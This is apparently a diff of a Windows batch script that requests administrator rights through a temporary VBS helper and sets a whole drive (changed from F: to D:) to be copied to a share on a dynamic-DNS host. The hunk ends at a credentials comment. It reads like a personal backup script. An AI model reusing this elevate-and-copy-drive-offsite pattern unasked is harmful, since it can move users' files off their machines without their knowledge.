@@ -5,7 +5,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 setlocal enabledelayedexpansion
 REM Source and Destination folders
-set "source_folder=F:\"
+set "source_folder=D:\"
 set "destination_folder=\\minhtuan283.ddns.net\test_share\test"
 
 REM Login credentials
